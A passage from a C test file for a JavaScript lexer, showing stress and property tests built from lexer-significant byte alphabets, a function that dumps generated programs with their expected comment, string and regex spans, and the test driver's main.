		uint32_t l = (uint32_t)strlen(unit[u]);

		for (w = 0; w + l <= MB; w += l)
			memcpy(big + w, unit[u], l);
		CK(partitions(big, w));
		/* and the same text with something after it that closes what it opened */
		for (i = 0; i < 64u; i++)
			big[w + i] = (uint8_t)"`'\"}])*/\n"[i % 10u];
		CK(partitions(big, w + 64u));
	}
}

/* ---- the properties of any input ------------------------------------------------------------ */

static void properties(void)
{
	/* JS alphabets: the bytes that mean something to the lexer, in three densities, and the bytes of the
	 * multi-byte white space and terminators one at a time */
	static const char a1[] = "ab1_$ \n\r\t'\"`{}()[]/*\\.+-<>=?:;,#xu0e";
	static const char a2[] = "/\\*'\"`${}\n x";
	static const char a3[] = "/*'`${}\n a\xe2\x80\xa8\xa9\xc2\xa0\xef\xbb\xbf<!-->\\-";
	static const char a4[] = "return /a/ in of case do else if (){}[]+-/ \n`'\"x1.=>";

	partition_for(KGENOME_TEXTUAL_LANG_JS, a1, 11u);
	partition_for(KGENOME_TEXTUAL_LANG_JS, a2, 12u);
	partition_for(KGENOME_TEXTUAL_LANG_JS, a3, 13u);
	partition_for(KGENOME_TEXTUAL_LANG_JS, a4, 14u);
	form_property_for(KGENOME_TEXTUAL_LANG_JS, a1, 21u);
	form_property_for(KGENOME_TEXTUAL_LANG_JS, a2, 22u);
	form_property_for(KGENOME_TEXTUAL_LANG_JS, a3, 23u);
	form_property_for(KGENOME_TEXTUAL_LANG_JS, a4, 24u);
}

/* Every program written to `dir` with what the generator knew of it and the form of it: for the checks that
 * run outside this test (V8's syntax check, TypeScript's parser). The test itself calls this with no argument. */
static int dump(const char *dir, uint32_t n)
{
	uint32_t i, k;
	char path[512];

	for (i = 0; i < n; i++) {
		FILE *f;
		uint32_t w;

		program(&G, 100000u + i);
		snprintf(path, sizeof path, "%s/p%u%s.js", dir, i, G.html ? "h" : "");
		f = fopen(path, "wb");
		if (!f)
			return 1;
		fwrite(G.buf, 1, G.n, f);
		fclose(f);
		snprintf(path, sizeof path, "%s/p%u%s.exp", dir, i, G.html ? "h" : "");
		f = fopen(path, "wb");
		if (!f)
			return 1;
		for (k = 0; k < G.nsp; k++) {
			const struct gspan *e = &G.sp[k];

			if (e->cls != G_CODE)
				fprintf(f, "%c%u,%u;", e->cls == G_COM ? 'K' : G.buf[e->off] == '/' ? 'R' : 'S', e->off, e->len);
		}
		fclose(f);
		w = form_buf(G.buf, G.n, FO1);
		snprintf(path, sizeof path, "%s/p%u%s.form", dir, i, G.html ? "h" : "");
		f = fopen(path, "wb");
		if (!f)
			return 1;
		fwrite(FO1, 1, w == 0xffffffffu ? 0u : w, f);
		fclose(f);
	}
	return 0;
}

int main(int argc, char **argv)
{
	if (argc >= 4 && !strcmp(argv[1], "--dump"))
		return dump(argv[2], (uint32_t)atoi(argv[3]));
	comments();
	strings();
	templates();
	regexes();
	known_limits();
	tokens();
	obfuscated();
	forms();
	decode_hook();
	api();
	hostile();
	generated(4000u, 1u);
	census_check();
	properties();
	printf("%s (%d failures)\n", fails ? "FAILED" : "ok", fails);
	return fails != 0;
}
